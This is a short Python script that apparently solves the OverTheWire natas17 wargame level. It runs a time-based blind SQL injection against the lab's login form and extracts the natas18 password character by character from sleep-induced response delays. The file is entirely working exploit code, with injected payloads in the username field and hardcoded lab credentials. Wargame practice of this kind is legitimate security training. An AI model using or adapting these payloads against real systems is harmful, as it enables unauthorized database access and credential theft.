import requests
from requests.auth import HTTPBasicAuth

Auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
headers = {'content-type': 'application/x-www-form-urlencoded'}

# Empty container for our final password
hacc = ""

# Set of all alphanumeric characters
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = ""
# filtered = "dghjlmpqsvwxyCDFIKOPR047"

if filtered == "":
    for char in chars:
        exploit = {
            'username': f'natas18" AND password LIKE BINARY "%{char}%" AND sleep(3) #'
        }
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', data=exploit, auth=Auth, headers=headers)
        if r.elapsed.seconds >= 2:
            filtered += char
            print(filtered)

while (len(hacc) < 32):
    for char in filtered:
        exploit = {
            'username': f'natas18" AND password LIKE BINARY"{hacc + char}%" AND sleep(4) #'
        }
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', data=exploit, auth=Auth, headers=headers)

        if r.elapsed.seconds >= 3:
            hacc += char
            print(hacc)
            break